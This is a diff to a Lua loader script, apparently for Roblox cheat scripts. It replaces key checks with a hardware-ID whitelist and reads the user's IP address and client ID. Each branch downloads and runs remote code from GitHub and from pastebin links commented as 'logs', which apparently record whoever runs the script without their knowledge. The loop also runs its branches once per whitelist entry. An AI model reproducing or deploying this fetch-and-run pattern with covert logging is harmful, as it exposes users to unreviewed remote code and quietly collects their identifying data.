@@ -1,7 +1,17 @@
-if _G.key == sub2appledevonytlol then
-  loadstring(game:HttpGet(('https://raw.githubusercontent.com/Sashkotashko420/wowwowowow/main/mainfree')))()
-end
+local HWIDTable = {
+"F9027583-6086-47E7-8025-26CF76A0E8AD", --my HWID
+"83AF5A2B-F4CD-4838-8BC0-3422621C5F7F" -- lxstunknown
+}
 
-if _G.premiumkey == omgogmgmogmogmogpas24515premiumkeyuwu then
-  loadstring(game:HttpGet(('https://raw.githubusercontent.com/Sashkotashko420/wowwowowowpremium/main/mainpremium')))()
+local IP = game:HttpGet('https://api.ipify.org', true)
+local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
+
+for i,v in pairs(HWIDTable) do
+    if v == HWID then
+        loadstring(game:HttpGet(('https://raw.githubusercontent.com/Sashkotashko420/wowwowowowpremium/main/mainpremium')))()
+        loadstring(game:HttpGet(('https://pastebin.com/raw/GruttHf6')))() -- premium logs
+    else
+        loadstring(game:HttpGet(('https://raw.githubusercontent.com/Sashkotashko420/wowwowowow/main/mainfree')))()
+        loadstring(game:HttpGet(('https://pastebin.com/raw/TAQrzzv2')))() -- logs
+    end
 end
